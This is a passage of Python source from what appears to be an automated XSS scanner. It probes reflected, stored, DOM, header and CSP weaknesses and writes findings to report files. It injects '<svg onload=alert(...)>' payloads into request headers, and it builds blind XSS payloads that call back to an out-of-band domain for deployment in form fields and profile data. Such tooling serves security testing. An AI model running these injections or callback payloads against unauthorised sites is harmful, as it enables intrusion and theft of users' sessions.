                url = line.strip().split()[0] if line.strip() else ""
                if url and url.endswith(".js") and url not in js_urls:
                    js_urls.append(url)
                    if len(js_urls) >= MAX_DOM_FILES:
                        break
        if len(js_urls) >= MAX_DOM_FILES:
            break

    if not js_urls:
        return findings

    log.info(f"    DOM analysis: {len(js_urls)} JS file(s)")

    for js_url in js_urls:
        resp = session.get(js_url, timeout=15)
        time.sleep(REQUEST_SLEEP)
        if resp is None or resp.status_code >= 400:
            continue
        content = _body(resp, limit=2_000_000)
        if not content:
            continue
        findings.extend(analyze_dom_js(js_url, content, js_url))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — STORED CANDIDATES
# ═════════════════════════════════════════════════════════════════════════════

def run_stored_candidates(
    session: Session, surface: dict, baseline: Baseline,
) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    marker = _new_marker()

    resp = _probe(session, surface, marker)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return findings

    parsed = urllib.parse.urlparse(surface["url"])
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in STORED_REVISIT_PATTERNS[:MAX_STORED_PAGES]:
        test_url = base + path
        r = session.get(test_url)
        time.sleep(REQUEST_SLEEP)
        if r is None or r.status_code >= 400:
            continue
        body = _body(r)
        idx = body.find(marker)
        if idx >= 0:
            context = classify_context(body, idx)
            findings.append(XSSFinding(
                target=test_url, param=surface["param"],
                param_location="query",
                xss_type="stored", context=context,
                severity="CRITICAL", confidence=80, confirmed=True,
                payload=marker, marker=marker,
                evidence=(
                    f"Injected marker reappeared on {test_url} "
                    f"after submission via {surface['param']}"
                ),
                details={
                    "injection_url": surface["url"],
                    "revisit_url": test_url,
                    "context": context,
                    "body_snippet": body[max(0, idx - 80): idx + 120],
                },
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — BLIND PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

def generate_blind_payloads(surface: dict, oob_domain: Optional[str]) -> list[dict]:
    if not oob_domain:
        return []
    token = _new_marker()
    oob_url = f"https://{token}.{oob_domain}"
    payloads = [BLIND_PAYLOAD_TEMPLATE.format(oob=oob_url)]
    payloads.extend(p.format(oob=oob_url) for p in BLIND_PAYLOADS_ALT)

    return [
        {
            "target": surface["url"], "param": surface["param"],
            "payload": p, "oob_url": oob_url, "token": token,
            "deployment": "Inject into form fields, headers, and profile data",
        }
        for p in payloads
    ]


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — CSP ANALYSIS (report-only aware)
# ═════════════════════════════════════════════════════════════════════════════

def analyze_csp(resp: requests.Response, target: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    if resp is None:
        return findings

    csp = resp.headers.get("Content-Security-Policy", "")
    csp_ro = resp.headers.get("Content-Security-Policy-Report-Only", "")

    if not csp and csp_ro:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="INFO", confidence=90, confirmed=True,
            payload="", evidence="Only Report-Only CSP present — directives are NOT enforced",
            details={"header": "Content-Security-Policy-Report-Only",
                     "value": csp_ro[:500]},
        ))
        return findings

    if not csp:
        return findings

    lower = csp.lower()

    if "unsafe-inline" in lower:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="HIGH", confidence=85, confirmed=False,
            payload="'unsafe-inline'",
            evidence="CSP allows 'unsafe-inline' — inline scripts execute",
            details={"header": "Content-Security-Policy", "directive": "unsafe-inline"},
        ))
    if "unsafe-eval" in lower:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="HIGH", confidence=85, confirmed=False,
            payload="'unsafe-eval'",
            evidence="CSP allows 'unsafe-eval' — eval() and Function() execute",
            details={"header": "Content-Security-Policy", "directive": "unsafe-eval"},
        ))
    if "script-src *" in lower or "script-src: *" in lower:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="HIGH", confidence=85, confirmed=False,
            payload="script-src *",
            evidence="script-src allows wildcard — any host can serve scripts",
            details={"header": "Content-Security-Policy", "directive": "script-src *"},
        ))
    for host in CSP_BYPASS_HOSTS:
        if host in csp:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity="MEDIUM", confidence=70, confirmed=False,
                payload=f"script-src {host}",
                evidence=f"script-src allowlists {host} — JSONP endpoints bypass CSP",
                details={"header": "Content-Security-Policy",
                         "allowlisted_host": host},
            ))
    if "base-uri" not in lower:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="MEDIUM", confidence=70, confirmed=False,
            payload="missing base-uri",
            evidence="CSP does not set base-uri — <base> tag injection redirects relative scripts",
            details={"header": "Content-Security-Policy", "directive": "base-uri"},
        ))
    if "object-src" not in lower:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="MEDIUM", confidence=70, confirmed=False,
            payload="missing object-src",
            evidence="CSP does not set object-src — plugin-based script execution possible",
            details={"header": "Content-Security-Policy", "directive": "object-src"},
        ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — HEADER REFLECTION (opt-in, per-host)
# ═════════════════════════════════════════════════════════════════════════════

def test_header_injection(session: Session, host_url: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    for header in HEADER_INJECTION_VECTORS:
        marker = _new_marker()
        payload = f"<svg onload=alert('{marker}')>"
        resp = session.get(host_url, headers={header: payload})
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        idx = body.find(marker)
        if idx < 0:
            # Try the raw payload
            idx = body.find(payload)
            if idx < 0:
                continue
        context = classify_context(body, idx)
        findings.append(XSSFinding(
            target=host_url, param=f"(header:{header})",
            param_location="header",
            xss_type="header", context=context,
            severity="HIGH", confidence=75, confirmed=True,
            payload=payload, marker=marker,
            evidence=f"Header '{header}' reflected in {context} context",
            http_status=resp.status_code,
            details={
                "header": header, "context": context,
                "body_snippet": body[max(0, idx - 80): idx + 120],
            },
        ))
        return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: Session, surface: dict,
    *, test_stored: bool = True, oob_domain: Optional[str] = None,
) -> tuple[Baseline, list[XSSFinding], Optional[dict]]:
    baseline = build_baseline(session, surface)

    # Phase 1
    reflection = probe_reflection(session, surface)
    if not reflection["reflected"]:
        return baseline, [], None

    # Phase 2 — classify
    marker = reflection["marker"]
    resp = _probe(session, surface, marker)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return baseline, [], None
    body = _body(resp)
    idx = body.find(marker)
    context = classify_context(body, idx) if idx >= 0 else "unknown"

    # Phase 3 + 4
    findings = test_context_payloads(session, surface, baseline, context)

    # Phase 6
    if test_stored:
        findings.extend(run_stored_candidates(session, surface, baseline))

    # Phase 7
    blind_payloads = generate_blind_payloads(surface, oob_domain)

    reflection_info = {
        "marker": marker,
        "context": context,
        "unencoded": reflection["unencoded"],
        "blind_payloads": blind_payloads,
    }
    return baseline, findings, reflection_info


# ═════════════════════════════════════════════════════════════════════════════
#  SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[XSSFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not available")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB is False")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED is False")
        return
    if not DB.available:
        log.warning("  DB sync: bridge client not ready")
        return
    method = getattr(DB, "upsert_xss_findings", None)
    if method is None:
        log.warning(
            "  DB sync: db.py is missing upsert_xss_findings() — "
            "add the method to enable dedicated-table sync"
        )
        return
    try:
        payloads = [f.to_dict() for f in findings]
        result = method(scan_id, payloads)
        if result is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {result} XSS finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xss_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    oob_domain: Optional[str] = None,
    test_stored: bool = True,
    test_dom: bool = True,
    test_headers: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _xss_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]

    urls = _load_urls(urls_file)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]
    outdir.mkdir(parents=True, exist_ok=True)

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))
    seen_s: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen_s:
            seen_s.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    log.info(f"  Modes  : stored={test_stored}  dom={test_dom}  headers={test_headers}")
    log.info("")

    limiter = SharedRateLimiter(eff_rate)
    session = Session(limiter, cfg_hdrs, eff_timeout)

    all_findings: list[XSSFinding] = []
    blind_payloads: list[dict] = []
    results: list[dict] = []

    def _process(surface: dict) -> tuple[dict, list[XSSFinding], Optional[dict]]:
        try:
            baseline, findings, reflection = audit_surface(
                session, surface,
                test_stored=test_stored, oob_domain=oob_domain,
            )
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"], "method": surface.get("method", "GET"),
                "baseline": baseline.to_dict(), "reflection": reflection,
                "finding_count": len(findings),
            }, findings, reflection
        except Exception as e:
            log.debug(f"    error on {surface['url']}: {e}")
            return {"url": surface["url"], "param": surface["param"],
                    "location": surface["location"], "error": str(e)}, [], None

    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
    with ThreadPoolExecutor(max_workers=eff_conc) as pool:
        futures = {pool.submit(_process, s): s for s in surfaces}
        done = 0
        for fut in as_completed(futures):
            done += 1
            try:
                result, findings, reflection = fut.result()
                results.append(result)
                all_findings.extend(findings)
                if reflection:
                    blind_payloads.extend(reflection.get("blind_payloads", []))
                if findings:
                    top = findings[0]
                    log.info(
                        f"    [{done:>3}/{len(surfaces)}] {top.xss_type:<10} "
                        f"{top.severity:<8} {top.context:<20} "
                        f"{result['url'][:40]} param={result['param']}"
                    )
                elif done % 20 == 0:
                    log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
            except Exception as e:
                log.debug(f"    future error: {e}")

    # ── DOM
    if test_dom:
        log.info("")
        log.info("  DOM XSS static analysis...")
        dom_findings = run_dom_analysis(session, outdir)
        all_findings.extend(dom_findings)
        log.info(f"    {len(dom_findings)} DOM finding(s)")

    # ── CSP (per-host)
    log.info("")
    log.info("  CSP analysis...")
    csp_seen: set[str] = set()
    for s in surfaces[:50]:
        host = urllib.parse.urlparse(s["url"]).hostname or ""
        if host in csp_seen:
            continue
        csp_seen.add(host)
        resp = session.get(s["url"], timeout=8)
        if resp:
            all_findings.extend(analyze_csp(resp, s["url"]))
    log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'csp')} CSP finding(s)")

    # ── Header injection (opt-in, per-host)
    if test_headers:
        log.info("")
        log.info("  Header reflection test...")
        header_seen: set[str] = set()
        for s in surfaces[:50]:
            host = urllib.parse.urlparse(s["url"]).hostname or ""
            if host in header_seen:
                continue
            header_seen.add(host)
            all_findings.extend(test_header_injection(session, s["url"]))
        log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'header')} header finding(s)")

    # ── Dedupe
    seen_f: set[tuple] = set()
    deduped: list[XSSFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.xss_type, f.context)
        if key not in seen_f:
            seen_f.add(key)
            f.auth_enabled = auth_on
            if not f.first_seen:
                f.first_seen = _db_now()
            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda f: (
        SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1,
        -f.confidence, f.target,
    ))

    # ── Outputs
    elapsed = time.monotonic() - start
    by_severity = {k: 0 for k in SEV_ORDER}
    by_type: dict[str, int] = {}
    by_context: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_type[f.xss_type] = by_type.get(f.xss_type, 0) + 1
        if f.context:
            by_context[f.context] = by_context.get(f.context, 0) + 1

    (outdir / "xss_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.xss_type}\t{f.context}\t{f.severity}\t"
            f"{f.confidence}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    confirmed_refl = [f for f in confirmed_list if f.xss_type in ("reflected", "stored", "header")]
    (outdir / "xss_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.context}\t{f.payload[:150]}"
            for f in confirmed_refl
        ) + ("\n" if confirmed_refl else "")
    )
    dom_list = [f for f in deduped if f.xss_type == "dom"]
    (outdir / "xss_dom.txt").write_text(
        "\n".join(
            f"{f.details.get('js_url', f.target)}\t"
            f"{f.details.get('source', '')}\t"
            f"{f.details.get('sink', '')}\t{f.evidence[:120]}"
            for f in dom_list
        ) + ("\n" if dom_list else "")
    )
    (outdir / "xss_blind.txt").write_text(
        "\n".join(
            f"{b['target']}\t{b['param']}\t{b['payload']}"
            for b in blind_payloads
        ) + ("\n" if blind_payloads else "")
    )
    csp_list = [f for f in deduped if f.xss_type == "csp"]
    (outdir / "xss_csp.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.payload}\t{f.severity}\t{f.evidence[:120]}"
            for f in csp_list
        ) + ("\n" if csp_list else "")
    )

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "config": {
            "rate_limit":    eff_rate,
            "concurrency":   eff_conc,
            "timeout":       eff_timeout,
            "test_stored":   test_stored,
            "test_dom":      test_dom,
            "test_headers":  test_headers,
            "oob_domain":    oob_domain,
            "max_surfaces":  eff_max,
        },
        "totals": {
            "urls_input":      len
